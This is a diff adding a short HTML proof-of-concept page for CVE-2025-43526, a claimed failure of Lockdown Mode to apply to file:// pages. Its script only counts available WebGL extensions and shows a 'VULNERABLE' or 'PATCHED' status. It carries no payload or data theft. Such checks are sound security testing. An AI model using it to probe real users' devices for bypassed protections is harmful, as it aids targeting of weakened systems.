@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC: CVE-2025-43526</title>
+</head>
+<body>
+    <script>
+        /**
+         * CVE-2025-43526: Security Restriction Bypass
+         * Vulnerability: Lockdown Mode fails to apply to file:// protocol.
+         * Requirement: Lockdown Mode = ENABLED.
+         */
+        
+        (function reportStatus() {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const extensions = gl ? gl.getSupportedExtensions() : [];
+            
+            // In Lockdown Mode, extensions.length should be ~0. 
+            // A bypass (vulnerability) is confirmed if extensions are fully accessible.
+            const isVulnerable = extensions.length > 5;
+
+            console.log("[+] Protocol:", window.location.protocol);
+            console.log("[+] WebGL Extensions Found:", extensions.length);
+
+            document.body.innerHTML = `
+                <h2>Status: ${isVulnerable ? 
+                    "<span style='color:red;'>VULNERABLE (Bypass Active)</span>" : 
+                    "<span style='color:green;'>PATCHED / SECURE</span>"}</h2>
+                <p>Extensions Detected: ${extensions.length}</p>
+                <p>Origin: ${window.location.href}</p>
+            `;
+        })();
+    </script>
+</body>
+</html>
